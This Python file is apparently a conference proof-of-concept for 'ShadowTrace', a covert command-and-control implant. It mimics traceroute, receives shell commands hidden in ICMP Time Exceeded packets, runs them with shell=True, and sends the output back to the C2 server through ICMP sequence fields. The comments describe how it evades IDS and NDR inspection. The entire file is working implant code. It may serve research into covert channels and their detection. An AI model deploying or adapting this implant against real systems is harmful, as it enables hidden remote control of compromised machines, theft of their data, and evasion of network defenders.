#!/usr/bin/env python3
"""
Shadow-C2 - Client / Implant (PoC for BlackHat Europe 2026 Arsenal)
================================================
Paper: High-Bandwidth Stealth C2 via Traceroute Mimicry and ICMP Time Exceeded

Fixes applied:
      -> reliable sniff-ready signaling, race condition eliminated

Sequence (slide figure):
  ping a.b.c.d (TTL=n+1) x3 -> Time-Exceeded from a.b.c.d+1  [chunk 0]
  ping a.b.c.d (TTL=n+2) x3 -> Time-Exceeded from a.b.c.d+2  [chunk 1]
  ...
  ping a.b.c.d (TTL=n+m+1) x3 -> Echo Reply from a.b.c.d     [done]

Usage:
  sudo python3 client.py <C2_SERVER_IP> [POLL_INTERVAL_SEC]
  e.g.: sudo python3 client.py 192.168.1.100 5

Requirements:
  pip install scapy
  (libpcap NOT required - uses lfilter only)
"""

from scapy.all import IP, ICMP, Raw, send, sr1, conf, AsyncSniffer
import subprocess
import struct
import time
import queue
import threading
import sys
import os
from datetime import datetime

# ========== Color output ==========
class C:
    RED    = "\033[91m"; GREEN  = "\033[92m"; YELLOW = "\033[93m"
    BLUE   = "\033[94m"; CYAN   = "\033[96m"; RESET  = "\033[0m"; BOLD = "\033[1m"

def log(tag, msg, color=C.RESET):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{color}[{ts}] [{tag}]{C.RESET} {msg}")

# ========== Protocol constants ==========
FLAG_DATA  = 0x0
FLAG_ACK   = 0x1
FLAG_RETRY = 0x2
FLAG_END   = 0x3

MAGIC_ICMP_ID = 0x5354       # "ST" (ShadowTrace identifier)

# Linux ping default: sequential bytes 0x08..0x37 (48 bytes data field)
ICMP_PAYLOAD = bytes(range(0x08, 0x38))

# Traceroute parameters
TTL_START      = 1
TTL_REAL_HOP   = 4      # real router probes up to this TTL (Phase 1)
PROBE_TIMEOUT  = 1.0    # per-probe timeout (seconds)
PROBE_INTERVAL = 0.1    # inter-probe interval (seconds)
CHUNK_TIMEOUT  = 5.0    # per-chunk receive timeout (seconds)

# Number of probes per TTL (matches real traceroute behavior)
PROBES_PER_TTL = 3


# ========== IP address utilities ==========

def ip_to_int(ip: str) -> int:
    parts = list(map(int, ip.split(".")))
    return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]

def int_to_ip(n: int) -> str:
    return f"{(n>>24)&0xFF}.{(n>>16)&0xFF}.{(n>>8)&0xFF}.{n&0xFF}"

def increment_ip(ip: str, offset: int) -> str:
    return int_to_ip(ip_to_int(ip) + offset)


# ========== Encode / Decode ==========

def encode_ip_id(session_id: int, chunk_idx: int, flag: int) -> int:
    """IP.id (16bit) = [Session ID: 4bit][Chunk Index: 10bit][Flag: 2bit]"""
    return ((session_id & 0xF) << 12) | ((chunk_idx & 0x3FF) << 2) | (flag & 0x3)

def decode_ip_id(ip_id: int):
    session_id = (ip_id >> 12) & 0xF
    chunk_idx  = (ip_id >> 2)  & 0x3FF
    flag       = ip_id         & 0x3
    return session_id, chunk_idx, flag

def extract_inner_payload(pkt) -> bytes:
    """

    Paper Section 4.4 (Bandwidth Amplification):
      Server embeds command data in the inner packet's data field.
      IDS inspects only outer ICMP Type=11, not inner payload.

    Scapy parses Time Exceeded as:
      IP(outer) / ICMP(type=11) / IPerror / ICMPerror / Raw(load=<data>)

    Strategy:
      1. Scapy layer-aware: use IPerror + Raw for reliability
         (robust against IP options changing the inner IP header length)
      2. Byte-offset fallback: offset = inner_IP(20B) + inner_ICMP(8B) = 28B
         (works when IHL=5, i.e. no IP options, which is our case)
    """
    try:
        # Strategy 1: scapy layer-aware access
        # IPerror is the parsed inner IP layer inside Time Exceeded
        from scapy.layers.inet import IPerror
        if pkt.haslayer(IPerror) and pkt.haslayer(Raw):
            return bytes(pkt[Raw].load)
    except Exception:
        pass

    # Strategy 2: byte-offset fallback
    try:
        # pkt[ICMP].payload = IPerror / ICMPerror / Raw (serialized)
        icmp_payload = bytes(pkt[ICMP].payload)
        offset = 20 + 8  # inner IP header (IHL=5, no options) + inner ICMP header
        if len(icmp_payload) > offset:
            return icmp_payload[offset:]
    except Exception:
        pass

    return b""


# ========== Client main class ==========

class ShadowTraceClient:
    def __init__(self, c2_ip: str, poll_interval: float = 5.0):
        self.c2_ip         = c2_ip
        self.poll_interval = poll_interval
        self.session_id    = 0x1
        self._downstream_chunks = 0  # set by _phase2_c2_mimicry, used in Phase 4/5 TTL

        self.stats = {"sessions": 0, "commands_exec": 0, "tx_packets": 0}

    # ---- Downstream receive ----

    def _recv_chunk(self, chunk_idx: int) -> tuple[bytes, int] | None:
        """
        Receive one Time Exceeded chunk from the C2 server.

            AsyncSniffer exposes a .started threading.Event that is set
            when the sniffer socket is open and the filter is applied.
            Calling .started.wait() guarantees no packet is missed before
            the Echo Request is sent - race condition fully eliminated.

            Eliminates libpcap dependency entirely.

        Expected source: a.b.c.d + (chunk_idx + 1)  <- slide figure
        """
        expected_src = increment_ip(self.c2_ip, chunk_idx + 1)
        pkt_queue: queue.Queue = queue.Queue()

        def _is_target(p) -> bool:
            # Check 1: outer ICMP type=11 (Time Exceeded) from expected spoof IP
            if not (p.haslayer(ICMP) and p[ICMP].type == 11 and
                    p.haslayer(IP) and p[IP].src == expected_src):
                return False
            # Check 2: outer IP.id must decode to a valid ShadowTrace session
            # (guards against any random Time Exceeded from the same IP range)
            try:
                sess, cidx, flag = decode_ip_id(p[IP].id)
                return sess != 0 and cidx == chunk_idx
            except Exception:
                return False

        # AsyncSniffer.started (Event) was only added in scapy 2.4.5+.
        # started_callback= fires when the socket is open and filter applied,
        # and works on all scapy versions that have AsyncSniffer.
        ready = threading.Event()
        sniffer = AsyncSniffer(
            lfilter=_is_target,
            prn=lambda p: pkt_queue.put(p),
            count=1,
            timeout=CHUNK_TIMEOUT,
            started_callback=ready.set,
        )
        sniffer.start()
        ready.wait(timeout=2.0)

        # Now safe to send: sniffer socket is open and filter applied
        ttl     = self._base_ttl + chunk_idx + 1
        flag_tx = FLAG_ACK if chunk_idx == 0 else FLAG_DATA

        for probe_num in range(1, PROBES_PER_TTL + 1):
            log("TX", f"Echo-Req TTL={ttl} chunk={chunk_idx:03d} "
                      f"flag={['DATA','ACK ','RTRY','END '][flag_tx]} "
                      f"probe={probe_num}/{PROBES_PER_TTL}", C.GREEN)
            self._send_echo_request(ttl, chunk_idx, flag_tx)
            if probe_num < PROBES_PER_TTL:
                time.sleep(PROBE_INTERVAL)

        # .empty() after join has a tiny race where put() completes after
        # join() but before empty() is called. get(timeout=) is atomic.
        sniffer.join(timeout=CHUNK_TIMEOUT + 0.5)

        try:
            pkt = pkt_queue.get(timeout=0.1)
        except queue.Empty:
            log("RX", f"Timeout: no Time-Exceeded from {expected_src}", C.RED)
            return None

        data = extract_inner_payload(pkt)

        # Decode flag from OUTER IP.id (server sets outer.id = encode_ip_id(...))
        _, _, flag_rx = decode_ip_id(pkt[IP].id)

        log("RX", f"Time-Exceeded  src={pkt[IP].src} (+{chunk_idx+1}) "
                  f"chunk={chunk_idx:03d} flag={['DATA','ACK ','RTRY','END '][flag_rx]} "
                  f"{len(data)}B", C.YELLOW)
        return data, flag_rx

    # ---- Upstream send ----

    def _send_echo_request(self, ttl: int, chunk_idx: int, flag: int, data_word: int = 0):
        """
        Send ICMP Echo Request

        Paper Section 4.2 compliant data carrier:
          IP.id    (16bit) = [Session: 4bit][ChunkIdx: 10bit][Flag: 2bit]  <- metadata
          ICMP.seq (16bit) = data_word                                      <- actual data
          Raw payload      = ICMP_PAYLOAD (fixed OS pattern, NO data)
        """
        ip_id = encode_ip_id(self.session_id, chunk_idx, flag)
        pkt = (IP(dst=self.c2_ip, ttl=ttl, id=ip_id)
               / ICMP(type=8, code=0, id=MAGIC_ICMP_ID, seq=data_word)
               / Raw(load=ICMP_PAYLOAD))
        send(pkt, verbose=0)
        self.stats["tx_packets"] += 1

    def send_result_chunks(self, result_bytes: bytes):
        """
        Send command execution result to C2 as Echo Request stream.

        Paper Section 4.2 compliant:
          - ICMP.seq (16bit) is the data carrier: 2 bytes per packet
          - Raw payload = ICMP_PAYLOAD (fixed, no data embedded)
          - PROBES_PER_TTL probes per chunk (traceroute mimicry)

        Final chunk (FLAG_END) uses sr1() on the last probe so the client
        receives the server's Echo Reply directly, eliminating the need for
        a separate Phase 5 probe at TTL+1.  Real traceroute stops when the
        destination replies - this matches that behaviour exactly.
        """
        chunks = [result_bytes[i:i+2] for i in range(0, len(result_bytes), 2)]
        if not chunks:
            chunks = [b"\x00\x00"]

        real_chunk_count = len(chunks)
        # 全ホップで必ず PROBES_PER_TTL 回プローブを送るためパディング
        pad = (-real_chunk_count) % PROBES_PER_TTL
        for _ in range(pad):
            chunks.append(b"\x00\x00")

        num_hops = len(chunks) // PROBES_PER_TTL
        log("TX", f"Sending result ({len(result_bytes)}B -> {real_chunk_count} chunks "
                  f"+ {pad} padding -> {num_hops} TTL hops x {PROBES_PER_TTL}) -> {self.c2_ip}", C.GREEN)

        for hop in range(num_hops):
            group_start  = hop * PROBES_PER_TTL
            group        = chunks[group_start:group_start + PROBES_PER_TTL]  # 常に PROBES_PER_TTL 個
            ttl          = self._base_ttl + self._downstream_chunks + hop + 1
            expected_src = increment_ip(self.c2_ip, self._downstream_chunks + hop + 1)

            # _recv_chunk と対称: スニファーを先に起動してからプローブを送信
            pkt_queue: queue.Queue = queue.Queue()
            ready = threading.Event()
            sniffer = AsyncSniffer(
                lfilter=lambda p, src=expected_src: (
                    p.haslayer(ICMP) and p[ICMP].type == 11
                    and p.haslayer(IP) and p[IP].src == src
                ),
                prn=lambda p: pkt_queue.put(p),
                count=PROBES_PER_TTL,
                timeout=CHUNK_TIMEOUT,
                started_callback=ready.set,
            )
            sniffer.start()
            ready.wait(timeout=2.0)

            # 各プローブに異なるチャンクデータを載せて送信
            for probe_num, chunk in enumerate(group):
                chunk_idx    = group_start + probe_num
                is_real_last = (chunk_idx == real_chunk_count - 1)
                is_last      = (hop == num_hops - 1) and (probe_num == PROBES_PER_TTL - 1)

                if chunk_idx < real_chunk_count:
                    flag      = FLAG_END if is_real_last else FLAG_DATA
                    data_word = struct.unpack(">H", chunk.ljust(2, b"\x00"))[0]
                else:
                    # パディングプローブ: トレースルート外観維持のためのダミー
                    flag      = FLAG_DATA
                    data_word = 0

                log("TX", f"Echo-Req TTL={ttl} chunk={chunk_idx:03d} "
                          f"flag={['DATA','ACK ','RTRY','END '][flag]} "
                          f"probe={probe_num+1}/{PROBES_PER_TTL}", C.GREEN)

                if is_last:
                    # 全体の最終プローブは sr1() でサーバーの Echo Reply を受信
                    ip_id = encode_ip_id(self.session_id, chunk_idx, flag)
                    pkt = (IP(dst=self.c2_ip, ttl=ttl, id=ip_id)
                           / ICMP(type=8, code=0, id=MAGIC_ICMP_ID, seq=data_word)
                           / Raw(load=ICMP_PAYLOAD))
                    resp = sr1(pkt, timeout=5, verbose=0)
                    if resp and resp.haslayer(ICMP) and resp[ICMP].type == 0:
                        log("TRACE", f"Echo Reply from {resp[IP].src}. "
                                     f"Traceroute 'complete'. OK", C.CYAN)
                    else:
                        log("TRACE", "No Echo Reply on final probe.", C.BLUE)
                else:
                    self._send_echo_request(ttl, chunk_idx, flag, data_word)
                    if probe_num < PROBES_PER_TTL - 1:
                        time.sleep(PROBE_INTERVAL)

            # Time-Exceeded 応答を収集してログ出力
            sniffer.join(timeout=CHUNK_TIMEOUT + 0.5)
            responses = []
            while True:
                try:
                    responses.append(pkt_queue.get_nowait())
                except queue.Empty:
                    break
            log("RX", f"Hop {hop+1}/{num_hops}: {len(responses)}/{PROBES_PER_TTL} "
                      f"Time-Exceeded from {expected_src}", C.YELLOW)

            if hop < num_hops - 1:
                time.sleep(PROBE_INTERVAL)

        log("TX", f"Result sent ({real_chunk_count} chunks, {num_hops} hops)", C.GREEN)

    # ---- Traceroute Mimicry sequence ----

    def _phase1_real_probes(self) -> int:
        """
        Phase 1: Real traceroute probes (TTL=1..TTL_REAL_HOP)

        Each TTL sends PROBES_PER_TTL probes (matches real traceroute).
        Real routers reply with Time Exceeded -> traffic looks like traceroute.
        Returns: last TTL used (used as base_ttl for Phase 2)
        """
        log("TRACE", f"Phase 1: Real traceroute probes TTL 1~{TTL_REAL_HOP} "
                     f"({PROBES_PER_TTL} probes/TTL)", C.BLUE)

        last_ttl = TTL_REAL_HOP
        for ttl in range(TTL_START, TTL_REAL_HOP + 1):
            responses = []
            for probe in range(1, PROBES_PER_TTL + 1):
                pkt  = (IP(dst=self.c2_ip, ttl=ttl)
                        / ICMP(type=8, code=0, id=0xDEAD, seq=ttl * 10 + probe)
                        / Raw(load=ICMP_PAYLOAD))
                resp = sr1(pkt, timeout=PROBE_TIMEOUT, verbose=0)
                if resp and resp.haslayer(ICMP):
                    responses.append(resp)
                if probe < PROBES_PER_TTL:
                    time.sleep(PROBE_INTERVAL)

            if responses:
                r    = responses[0]
                t    = r[ICMP].type
                name = {0: "EchoReply", 11: "TimeExceeded"}.get(t, f"type={t}")
                log("TRACE", f"  TTL={ttl:2d}  {r[IP].src}  ({name})  "
                              f"{len(responses)}/{PROBES_PER_TTL} responses", C.BLUE)
            else:
                log("TRACE", f"  TTL={ttl:2d}  *  *  *  (no response)", C.BLUE)

            time.sleep(PROBE_INTERVAL)

        return last_ttl

    def _phase2_c2_mimicry(self) -> str | None:
        """
        Phase 2: C2 intervention phase (main slide sequence)

        Paper Section 4.3 - Recursive Time Exceeded:
          Loop:
            2. Send Echo-Req x PROBES_PER_TTL, TTL = base_ttl + chunk_idx + 1
            3. Receive Time-Exceeded from a.b.c.d + (chunk_idx + 1)
            4. Repeat until FLAG_END

        IDS/NDR sees:
          "traceroute still in progress - can't reach destination"
          "each hop's router returns Time Exceeded in sequence"
        """
        log("TRACE", f"Phase 2: C2 intervention "
                     f"({PROBES_PER_TTL} probes/TTL, sniff-first)", C.CYAN)

        rx_chunks = {}
        chunk_idx = 0

        while True:
            result = self._recv_chunk(chunk_idx)
            if result is None:
                log("TRACE", f"Chunk {chunk_idx} timeout. Aborting session.", C.RED)
                return None

            data, flag_rx = result
            rx_chunks[chunk_idx] = data

            if flag_rx == FLAG_END:
                ordered = b"".join(rx_chunks[k] for k in sorted(rx_chunks.keys()))
                command = ordered.decode("utf-8", errors="replace").rstrip("\x00")
                self._downstream_chunks = chunk_idx + 1  # save for Phase 4 TTL offset
                log("TRACE", f"Command assembled ({len(ordered)}B): "
                             f"{C.BOLD}{command}{C.RESET}", C.CYAN)
                return command

            chunk_idx += 1
            time.sleep(PROBE_INTERVAL)

    # ---- Command execution ----

    def execute_command(self, command: str) -> bytes:
        log("EXEC", f"Executing: {C.BOLD}{command}{C.RESET}", C.YELLOW)
        print(f"  {C.YELLOW}{'─'*50}{C.RESET}")
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=15)
            output = result.stdout
            if result.stderr:
                output += "\n[STDERR]\n" + result.stderr
            print(output.rstrip())
        except subprocess.TimeoutExpired:
            output = "TIMEOUT: command took too long"
            print(f"  {C.RED}{output}{C.RESET}")
        except Exception as e:
            output = f"ERROR: {e}"
            print(f"  {C.RED}{output}{C.RESET}")
        print(f"  {C.YELLOW}{'─'*50}{C.RESET}")
        self.stats["commands_exec"] += 1
        return output.encode("utf-8")

    # ---- Main session loop ----

    def run_session(self):
        self.stats["sessions"] += 1
        n = self.stats["sessions"]
        log("SES", f"{'='*60}", C.BOLD)
        log("SES", f"Session #{n} -> {self.c2_ip}", C.BOLD)

        # Reset per-session state
        self._downstream_chunks = 0

        # Phase 1: real traceroute probes (PROBES_PER_TTL per TTL)
        self._base_ttl = self._phase1_real_probes()

        # Phase 2: C2 intervention + command receive (AsyncSniffer, PROBES_PER_TTL/TTL)
        command = self._phase2_c2_mimicry()
        if command is None:
            log("SES", "No command received. Session aborted.", C.RED)
            return

        # Phase 3: execute command locally
        result_bytes = self.execute_command(command)

        # Phase 4: send result upstream (ICMP.seq carrier, PROBES_PER_TTL/TTL)
        # The last probe of the last chunk uses sr1() and catches the server's
        # Echo Reply directly, completing the traceroute mimicry sequence.
        total_result_chunks = max(1, (len(result_bytes) + 1) // 2)
        self.send_result_chunks(result_bytes)

        log("SES", f"Session #{n} complete.", C.BOLD)

    def run(self):
        if os.geteuid() != 0:
            print(f"{C.RED}[ERROR] Root privileges required (sudo){C.RESET}")
            sys.exit(1)

        conf.verb = 0
        print(f"\n{C.BOLD}{C.CYAN}ShadowTrace Implant (Client){C.RESET}")
        print(f"  C2 Server      : {self.c2_ip}")
        print(f"  Poll interval  : {self.poll_interval}s")
        print(f"  Magic ICMP ID  : 0x{MAGIC_ICMP_ID:04X}")
        print(f"  Real hop probe : TTL 1~{TTL_REAL_HOP}")
        print(f"  Probes/TTL     : {PROBES_PER_TTL} (match real traceroute)")
        print(f"  Data carrier   : ICMP.seq 16bit (paper Section 4.2)")
        print(f"  Sniffer        : AsyncSniffer + .started.wait() (race-free)")
        print(f"  libpcap        : NOT required (lfilter only)\n")

        log("CLI", "ShadowTrace implant running. Ctrl+C to stop.", C.CYAN)

        while True:
            try:
                self.run_session()
                log("WAIT", f"Next session in {self.poll_interval}s ...", C.RESET)
                time.sleep(self.poll_interval)
            except KeyboardInterrupt:
                log("EXIT", "Stopped by user.", C.RED)
                break


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <C2_SERVER_IP> [POLL_INTERVAL_SEC]")
        print(f"  e.g.: sudo python3 {sys.argv[0]} 192.168.1.100 5")
        sys.exit(1)

    c2_ip    = sys.argv[1]
    interval = float(sys.argv[2]) if len(sys.argv) > 2 else 5.0

    ShadowTraceClient(c2_ip, poll_interval=interval).run()
